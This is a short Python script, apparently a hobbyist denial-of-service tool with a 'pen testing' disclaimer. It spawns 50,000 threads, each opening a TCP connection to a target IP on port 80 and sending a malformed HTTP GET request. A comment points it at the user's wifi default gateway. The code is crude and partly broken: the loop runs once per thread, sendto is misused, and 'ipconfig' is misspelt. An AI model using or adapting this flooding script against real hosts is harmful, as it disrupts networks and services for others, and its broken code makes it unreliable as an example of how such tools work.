# Only use for pen testing purposes
import socket
import threading

ip =  "my wifi ip" #(in cmd) ipcong -> Default gateway 
port = 80 
def dos_attack():
    x = True
    while x:
        server  = socket.socket()
        server.connect((ip, port))

        server.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('utf-8'), (ip, port))

        print("connected")
        server.close()
        x = False

def main(n):
    for _ in range(n):
        thread = threading.Thread(target=dos_attack)
        thread.start()


main(50000)